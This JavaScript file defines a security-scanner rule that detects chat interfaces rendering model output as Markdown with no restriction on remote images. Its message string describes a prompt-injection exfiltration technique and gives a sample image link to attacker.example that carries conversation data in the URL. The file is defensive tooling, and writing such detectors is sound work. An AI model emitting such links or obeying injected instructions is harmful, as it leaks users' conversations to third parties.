const RENDER_RE =
  /<(?:ReactMarkdown|MemoizedReactMarkdown|MarkdownHooks|Streamdown|\w{0,40}Memo\w{0,20}Markdown\w{0,20}|\w{0,40}Markdown\w{0,20}Memo\w{0,20})\b|\bmarked(?:\.parse)?\s*\(|\bnew\s+MarkdownIt\b|\bmarkdown[iI]t\s*\(|\bmicromark\s*\(|\bsnarkdown\s*\(|\bnew\s+showdown\.Converter\b/;

const MODEL_CONTEXT_RE =
  /\brole\s*[!=]==?\s*['"](?:assistant|ai|bot|model)['"]|\buse(?:Chat|Completion|Assistant)\b|@ai-sdk\/|from\s+['"]ai(?:\/react)?['"]|\b(?:assistant|ai|bot|llm|model)(?:Message|Response|Reply|Output|Content|Text)\b|\b(?:ChatMessage|MessageContent|MessageBubble)\b|\bisStreaming\b|\bmessage\.(?:content|parts)\b/;

const MODEL_DIRS = new Set(['message', 'messages', 'conversation', 'conversations', 'assistant', 'answer', 'answers', 'reply', 'replies']);
const MODEL_FILE_RE = /message|answer|assistant|reply|chat-?bubble|chat-?message/i;

function modelPath(file) {
  const parts = file.split(/[\\/]/).filter(Boolean);
  const base = parts[parts.length - 1] ?? '';
  return MODEL_FILE_RE.test(base.replace(/\.[cm]?[jt]sx?$/i, '')) || parts.slice(-3, -1).some((d) => MODEL_DIRS.has(d.toLowerCase()));
}

const IMAGE_POLICY_RE =
  /\ballowedImagePrefixes\s*[:=]\s*\{?\s*\[\s*(?!['"]\*['"])|\burlTransform\b|\btransformImageUri\b|\bdisallowedElements\b[^\n]{0,200}['"]img['"]|\ballowedElements\b|\b(?:allow(?:ed)?(?:List|Hosts|Origins|Domains|Prefixes|Images)|isAllowed(?:Url|Image|Host|Src)?|trusted(?:Hosts|Origins|Domains|Images)|imgProxy|imageProxy|proxyUrl|camo)\b/i;

const COMPONENTS_REF_RE = /\bcomponents\s*=\s*\{\s*([A-Za-z_$][\w$.]*)\s*\}|\bcomponents\s*:\s*([A-Za-z_$][\w$.]*)\s*[,}]/g;
const IMG_OVERRIDE_RE = /\bimg\s*[:(]|['"]img['"]\s*:/;

function opaqueComponents(text) {
  for (const m of text.matchAll(COMPONENTS_REF_RE)) {
    const name = m[1] ?? m[2];
    if (name.includes('.')) return true;
    const at = text.search(new RegExp(`\\b(?:const|let|var)\\s+${name.replace(/\$/g, '\\$')}\\b[^=\\n]{0,80}=\\s*\\{`));
    if (at < 0 || IMG_OVERRIDE_RE.test(text.slice(at, at + 3000))) return true;
  }
  return false;
}

const verdicts = new WeakMap();

function quiet(ctx) {
  const lines = ctx?.lines ?? [];
  const cached = verdicts.get(lines);
  if (cached !== undefined) return cached;
  const text = lines.join('\n');
  const modelOutput = MODEL_CONTEXT_RE.test(text) || modelPath(ctx?.file ?? '');
  const verdict = !modelOutput || IMAGE_POLICY_RE.test(text) || opaqueComponents(text);
  verdicts.set(lines, verdict);
  return verdict;
}

export function markdownImageRules() {
  return [
    {
      id: 'js.model_markdown_remote_images',
      title: 'Model output is rendered as Markdown that loads any remote image',
      severity: 'MEDIUM',
      category: 'unsafe-output',
      confidence: 0.6,
      re: RENDER_RE,
      sink: (m) => m[0].replace(/\($/, '').trim(),
      source: 'model output',
      message:
        'This renders model output (or content retrieved for the model) as Markdown and nothing in the file limits where an image may load from. An answer that an injected document, page or tool result shaped can carry ![x](https://attacker.example/?d=...) and the browser fetches it the moment the message appears - no click, with the conversation in the address. If an image policy is set elsewhere (a Content-Security-Policy img-src, a shared components map), this does not apply.',
      remediation:
        'Allow images only from hosts you control (allowedImagePrefixes, a urlTransform that drops other hosts, or disallowedElements: ["img"]), route the rest through your own image proxy, and set a Content-Security-Policy img-src for the page.',
      cwe: 'CWE-201',
      suppress: (_m, _unit, ctx) => quiet(ctx),
    },
  ];
}
